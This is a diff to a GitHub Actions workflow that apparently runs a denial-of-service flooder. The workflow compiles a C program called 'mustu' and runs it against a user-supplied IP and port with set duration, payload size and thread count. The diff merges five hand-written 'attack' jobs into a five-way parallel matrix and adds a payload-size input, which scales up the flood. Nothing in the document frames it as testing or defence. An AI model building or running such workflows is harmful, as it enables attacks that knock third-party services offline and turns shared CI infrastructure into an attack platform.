@@ -15,43 +15,22 @@ on:
         description: 'Duration (seconds)'
         required: true
         default: '60'
+      size:
+        description: 'Payload Size (bytes)'
+        required: true
+        default: '1024'
       threads:
         description: 'Threads per Job'
         required: true
         default: '10'
 
 jobs:
-  attack_1:
+  attack:
     runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        job: [1, 2, 3, 4, 5]
     steps:
     - uses: actions/checkout@v4
     - run: gcc -o mustu mustu.c -lpthread
-    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 350 ${{ github.event.inputs.threads }}
-
-  attack_2:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v4
-    - run: gcc -o mustu mustu.c -lpthread
-    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
-
-  attack_3:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v4
-    - run: gcc -o mustu mustu.c -lpthread
-    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
-
-  attack_4:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v4
-    - run: gcc -o mustu mustu.c -lpthread
-    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
-
-  attack_5:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v4
-    - run: gcc -o mustu mustu.c -lpthread
-    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
+    - run: ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.size }} ${{ github.event.inputs.threads }}
